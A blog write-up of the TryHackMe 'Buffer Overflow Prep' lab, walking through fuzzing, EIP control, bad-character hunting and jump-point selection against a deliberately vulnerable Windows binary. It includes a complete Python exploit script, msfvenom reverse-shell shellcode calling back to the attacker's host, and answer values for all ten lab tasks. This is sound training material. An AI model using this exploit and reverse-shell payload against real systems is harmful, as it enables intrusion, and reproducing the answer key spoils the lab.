---
layout: post
title: THM — Buffer Overflow Prep
date: 2022-10-04 00:00:00 -500
categories: [TryHackMe]
tags: [Buffer Overflow, OSCP]
---

<img src="/assets/images/THM/Buffer%20Overflow%20Prep/logo.png" width="20%">

***

<center><strong><font color="White">Buffer Overflow Prep</font></strong></center>

***

## <strong><font color="#34A5DA">Information</font></strong>

This room uses a 32-bit Windows 7 VM with Immunity Debugger and Putty preinstalled. Windows Firewall and Defender have both been disabled to make exploit writing easier.

You can log onto the machine using RDP with the following credentials: admin/password

I suggest using the xfreerdp command: `xfreerdp /u:admin /p:password /cert:ignore /v:MACHINE_IP /workarea`

If Windows prompts you to choose a location for your network, choose the "Home" option.

On your Desktop there should be a folder called "vulnerable-apps". Inside this folder are a number of binaries which are vulnerable to simple stack based buffer overflows (the type taught on the PWK/OSCP course):
* The SLMail installer.
* The brainpan binary.
* The dostackbufferoverflowgood binary.
* The vulnserver binary.
* A custom written "oscp" binary which contains 10 buffer overflows, each with a different EIP offset and set of badchars.

I have also written a handy guide to exploiting buffer overflows with the help of mona: https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst

Please note that this room does not teach buffer overflows from scratch. It is intended to help OSCP students and also bring to their attention some features of mona which will save time in the OSCP exam.

*** 

## <strong><font color="#34A5DA">oscp.exe — OVERFLOW1</font></strong>

Right-click the Immunity Debugger icon on the Desktop and choose "Run as administrator".

When Immunity loads, click the open file icon, or choose File -> Open. Navigate to the vulnerable-apps folder on the admin user's desktop, and then the "oscp" folder. Select the "oscp" (oscp.exe) binary and click "Open".

The binary will open in a "paused" state, so click the red play icon or choose Debug -> Run. In a terminal window, the oscp.exe binary should be running, and tells us that it is listening on port 1337.

On your Kali box, connect to port 1337 on 10.10.56.43 using netcat:
```bash
nc 10.10.56.43 1337
```

Type "HELP" and press Enter. Note that there are 10 different OVERFLOW commands numbered 1 - 10. Type "OVERFLOW1 test" and press enter. The response should be "OVERFLOW1 COMPLETE". Terminate the connection.

### <font color="#FFA500">Mona Configuration</font>

The mona script has been preinstalled, however to make it easier to work with, you should configure a working folder using the following command, which you can run in the command input box at the bottom of the Immunity Debugger window:
```
!mona config -set workingfolder c:\mona\%p
```

### <font color="#FFA500">Fuzzing</font>

Create a file on your Kali box called fuzzer.py with the following contents:

```python
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.56.43"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

Run the fuzzer.py script using python: `python3 fuzzer.py`.

```
vladislav@Mac ~ % python3 fuzzer.py
Fuzzing with 100 bytes
Fuzzing with 200 bytes
Fuzzing with 300 bytes
Fuzzing with 400 bytes
Fuzzing with 500 bytes
Fuzzing with 600 bytes
Fuzzing with 700 bytes
Fuzzing with 800 bytes
Fuzzing with 900 bytes
Fuzzing with 1000 bytes
Fuzzing with 1100 bytes
Fuzzing with 1200 bytes
Fuzzing with 1300 bytes
Fuzzing with 1400 bytes
Fuzzing with 1500 bytes
Fuzzing with 1600 bytes
Fuzzing with 1700 bytes
Fuzzing with 1800 bytes
Fuzzing with 1900 bytes
Fuzzing with 2000 bytes
Fuzzing crashed at 2000 bytes
```

It stopped at 2000, so the offset is somewhere between 1900 and 2000.

The fuzzer will send increasingly long strings comprised of `A`'s. If the fuzzer crashes the server with one of the strings, the fuzzer should exit with an error message. Make a note of the largest number of bytes that were sent.

### <font color="#FFA500">Crash Replication & Controlling EIP</font>

Create another file on your Kali box called exploit.py with the following contents:

```python
import socket

ip = "10.10.56.43"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

Run the following command to generate a cyclic pattern of a length 400 bytes longer than the string that crashed the server (change the -l value to this):

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
```

In out situation the value will be: `2400` (2000 + 400)

```
vladislav@Mac exploit % /opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 2000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9
```

Copy the output and place it into the payload variable of the exploit.py script.

<img src="/assets/images/THM/Buffer%20Overflow%20Prep/1.png" width="80%">

On Windows, in Immunity Debugger, re-open the oscp.exe again using the same method as before, and click the red play icon to get it running. You will have to do this prior to each time we run the exploit.py (which we will run multiple times with incremental modifications).

On Kali, run the modified exploit.py script: `python3 exploit.py`.

```
vladislav@Mac ~ % python3 exploit.py
Sending evil buffer...
Done!
```

The script should crash the oscp.exe server again. This time, in Immunity Debugger, in the command input box at the bottom of the screen, run the following mona command, changing the distance to the same length as the pattern you created:

```
!mona findmsp -distance 600
```

In out situation the value will be: `2400`.

Mona should display a log window with the output of the command. If not, click the "Window" menu and then "Log data" to view it (choose "CPU" to switch back to the standard view).

<img src="/assets/images/THM/Buffer%20Overflow%20Prep/2.png" width="80%">

In this output you should see a line which states:
```
EIP contains normal pattern : ... (offset XXXX)
```

In our case:
```
EIP contains normal pattern : 0x6f43396e (offset 1978)
```

Update your exploit.py script and set the offset variable to this value (was previously set to 0). Set the payload variable to an empty string again. Set the retn variable to "BBBB".

<img src="/assets/images/THM/Buffer%20Overflow%20Prep/3.png" width="80%">

Restart oscp.exe in Immunity and run the modified exploit.py script again. The EIP register should now be overwritten with the 4 B's (e.g. 42424242).

<img src="/assets/images/THM/Buffer%20Overflow%20Prep/4.png" width="60%">

### <font color="#FFA500">Finding Bad Characters</font>

Generate a bytearray using mona, and exclude the null byte (\x00) by default. Note the location of the bytearray.bin file that is generated (if the working folder was set per the Mona Configuration section of this guide, then the location should be C:\mona\oscp\bytearray.bin).

```
!mona bytearray -b "\x00"
```

The output bytearray.txt file:
```
================================================================================
  Output generated by mona.py v2.0, rev 605 - Immunity Debugger
  Corelan Team - https://www.corelan.be
================================================================================
  OS : 7, release 6.1.7601
  Process being debugged : oscp (pid 4044)
  Current mona arguments: bytearray -b "\x00"
================================================================================
  2022-10-04 10:24:17
================================================================================
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

Now generate a string of bad chars that is identical to the bytearray. The following python script can be used to generate a string of bad chars from \x01 to \xff:

```python
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

```
vladislav@Mac ~ % python3 script.py
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

Update your exploit.py script and set the payload variable to the string of bad chars the script generates.

Restart oscp.exe in Immunity and run the modified exploit.py script again. Make a note of the address to which the ESP register points and use it in the following mona command:

```
ESP 0198FA30
```

```
!mona compare -f C:\mona\oscp\bytearray.bin -a <address>
```

In out case:

```
!mona compare -f C:\mona\oscp\bytearray.bin -a 0198FA30
```

A popup window should appear labelled "mona Memory comparison results". If not, use the Window menu to switch to it. The window shows the results of the comparison, indicating any characters that are different in memory to what they are in the generated bytearray.bin file.

<img src="/assets/images/THM/Buffer%20Overflow%20Prep/5.png" width="80%">

Not all of these might be badchars! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string.

The first badchar in the list should be the null byte (\x00) since we already removed it from the file. Make a note of any others. Generate a new bytearray in mona, specifying these new badchars along with \x00. Then update the payload variable in your exploit.py script and remove the new badchars as well.

Restart oscp.exe in Immunity and run the modified exploit.py script again. Repeat the badchar comparison until the results status returns "Unmodified". This indicates that no more badchars exist.

Adding `\x07` to badchars:

<img src="/assets/images/THM/Buffer%20Overflow%20Prep/6.png" width="80%">

Adding `x2e` to badchars:

<img src="/assets/images/THM/Buffer%20Overflow%20Prep/7.png" width="80%">

Adding `xa0` to badchars:

<img src="/assets/images/THM/Buffer%20Overflow%20Prep/8.png" width="80%">

Here are all comparisons step by step:

<img src="/assets/images/THM/Buffer%20Overflow%20Prep/9.png" width="80%">

To note what I was doing to get this:
1. Open oscp.exe
2. Run oscp.exe in Immunity Debugger
3. Delete next bad char from payload of exploit.py
4. Run exploit.py
5. Run `!mona bytearray -b "*"` — where `*` is all bad chars step by step + 
6. Run `!mona compare -f C:\mona\oscp\bytearray.bin -a *` — where `*` is ESP address (it changes)
7. If Type isn't unmodified — start with first step adding next badchar.

### <font color="#FFA500">Finding a Jump Point</font>

With the oscp.exe either running or in a crashed state, run the following mona command, making sure to update the -cpb option with all the badchars you identified (including \x00):

```
!mona jmp -r esp -cpb "\x00"
```

In our case it's `\x00\x07\x2e\xa0`.

This command finds all "jmp esp" (or equivalent) instructions with addresses that don't contain any of the badchars specified. The results should display in the "Log data" window (use the Window menu to switch to it if needed).

<img src="/assets/images/THM/Buffer%20Overflow%20Prep/10.png" width="80%">

Choose an address and update your exploit.py script, setting the "retn" variable to the address, written backwards (since the system is little endian). For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.

Let's choose address `0x625011af`. In exploit we will write: `\xaf\x11\x50\x62`.

### <font color="#FFA500">Generate Payload</font>

Run the following msfvenom command on Kali, using your Kali VPN IP as the LHOST and updating the -b option with all the badchars you identified (including \x00):

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c
```

In our case it will be:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.85.81 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
```

```
unsigned char buf[] = 
"\xbf\xc7\xdc\xa1\x3a\xdb\xcb\xd9\x74\x24\xf4\x5a\x29\xc9"
"\xb1\x52\x31\x7a\x12\x03\x7a\x12\x83\x2d\x20\x43\xcf\x4d"
"\x31\x06\x30\xad\xc2\x67\xb8\x48\xf3\xa7\xde\x19\xa4\x17"
"\x94\x4f\x49\xd3\xf8\x7b\xda\x91\xd4\x8c\x6b\x1f\x03\xa3"
"\x6c\x0c\x77\xa2\xee\x4f\xa4\x04\xce\x9f\xb9\x45\x17\xfd"
"\x30\x17\xc0\x89\xe7\x87\x65\xc7\x3b\x2c\x35\xc9\x3b\xd1"
"\x8e\xe8\x6a\x44\x84\xb2\xac\x67\x49\xcf\xe4\x7f\x8e\xea"
"\xbf\xf4\x64\x80\x41\xdc\xb4\x69\xed\x21\x79\x98\xef\x66"
"\xbe\x43\x9a\x9e\xbc\xfe\x9d\x65\xbe\x24\x2b\x7d\x18\xae"
"\x8b\x59\x98\x63\x4d\x2a\x96\xc8\x19\x74\xbb\xcf\xce\x0f"
"\xc7\x44\xf1\xdf\x41\x1e\xd6\xfb\x0a\xc4\x77\x5a\xf7\xab"
"\x88\xbc\x58\x13\x2d\xb7\x75\x40\x5c\x9a\x11\xa5\x6d\x24"
"\xe2\xa1\xe6\x57\xd0\x6e\x5d\xff\x58\xe6\x7b\xf8\x9f\xdd"
"\x3c\x96\x61\xde\x3c\xbf\xa5\x8a\x6c\xd7\x0c\xb3\xe6\x27"
"\xb0\x66\xa8\x77\x1e\xd9\x09\x27\xde\x89\xe1\x2d\xd1\xf6"
"\x12\x4e\x3b\x9f\xb9\xb5\xac\xaa\x36\xe0\x7d\xc3\x4a\x0a"
"\x6f\x4f\xc2\xec\xe5\x7f\x82\xa7\x91\xe6\x8f\x33\x03\xe6"
"\x05\x3e\x03\x6c\xaa\xbf\xca\x85\xc7\xd3\xbb\x65\x92\x89"
"\x6a\x79\x08\xa5\xf1\xe8\xd7\x35\x7f\x11\x40\x62\x28\xe7"
"\x99\xe6\xc4\x5e\x30\x14\x15\x06\x7b\x9c\xc2\xfb\x82\x1d"
"\x86\x40\xa1\x0d\x5e\x48\xed\x79\x0e\x1f\xbb\xd7\xe8\xc9"
"\x0d\x81\xa2\xa6\xc7\x45\x32\x85\xd7\x13\x3b\xc0\xa1\xfb"
"\x8a\xbd\xf7\x04\x22\x2a\xf0\x7d\x5e\xca\xff\x54\xda\xea"
"\x1d\x7c\x17\x83\xbb\x15\x9a\xce\x3b\xc0\xd9\xf6\xbf\xe0"
"\xa1\x0c\xdf\x81\xa4\x49\x67\x7a\xd5\xc2\x02\x7c\x4a\xe2"
"\x06";
```

Copy the generated C code strings and integrate them into your exploit.py script payload variable using the following notation:

```
payload = ("\xfc\xbb\xa1\x8a\x96\xa2\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x5d\x62\x14\xa2\x9d"
...
"\xf7\x04\x44\x8d\x88\xf2\x54\xe4\x8d\xbf\xd2\x15\xfc\xd0\xb6"
"\x19\x53\xd0\x92\x19\x53\x2e\x1d")
```

### <font color="#FFA500">Prepend NOPs</font>

Since an encoder was likely used to generate the payload, you will need some space in memory for the payload to unpack itself. You can do this by setting the padding variable to a string of 16 or more "No Operation" (\x90) bytes:
```
padding = "\x90" * 16
```

### <font color="#FFA500">Exploit!</font>

With the correct prefix, offset, return address, padding, and payload set, you can now exploit the buffer overflow to get a reverse shell.

Start a netcat listener on your Kali box using the LPORT you specified in the msfvenom command (4444 if you didn't change it).

Restart oscp.exe in Immunity and run the modified exploit.py script again. Your netcat listener should catch a reverse shell!

<img src="/assets/images/THM/Buffer%20Overflow%20Prep/11.png" width="80%">

Success!

> What is the EIP offset for OVERFLOW1? `1978`
> In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW1? `\x00\x07\x2e\xa0`

*** 

## <strong><font color="#34A5DA">oscp.exe — OVERFLOW2</font></strong>

> What is the EIP offset for OVERFLOW2? `634`
> In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW2? `\x00\x23\x3c\x83\xba`

*** 

## <strong><font color="#34A5DA">oscp.exe — OVERFLOW3</font></strong>

> What is the EIP offset for OVERFLOW3? `1274`
> In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW3? `\x00\x11\x40\x5F\xb8\xee`

*** 

## <strong><font color="#34A5DA">oscp.exe — OVERFLOW4</font></strong>

> What is the EIP offset for OVERFLOW4? `2026`
> In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW4? `\x00\xa9\xcd\xd4`

*** 

## <strong><font color="#34A5DA">oscp.exe — OVERFLOW5</font></strong>

> What is the EIP offset for OVERFLOW5? `314`
> In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW5? `\x00\x16\x2f\xf4\xfd`

*** 

## <strong><font color="#34A5DA">oscp.exe — OVERFLOW6</font></strong>

> What is the EIP offset for OVERFLOW6? `1034`
> In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW6? `\x00\x08\x2c\xad`

*** 

## <strong><font color="#34A5DA">oscp.exe — OVERFLOW7</font></strong>

> What is the EIP offset for OVERFLOW7? `1306`
> In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW7? `\x00\x8c\xae\xbe\xfb`

*** 

## <strong><font color="#34A5DA">oscp.exe — OVERFLOW8</font></strong>

> What is the EIP offset for OVERFLOW8? `1786`
> In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW8? `\x00\x1d\x2e\xc7\xee`

*** 

## <strong><font color="#34A5DA">oscp.exe — OVERFLOW9</font></strong>

> What is the EIP offset for OVERFLOW9? `1514`
> In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW9? `\x00\x04\x3e\x3f\xe1`

*** 

## <strong><font color="#34A5DA">oscp.exe — OVERFLOW10</font></strong>

> What is the EIP offset for OVERFLOW10? `537`
> In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW10? `\x00\xa0\xad\xbe\xde\xef`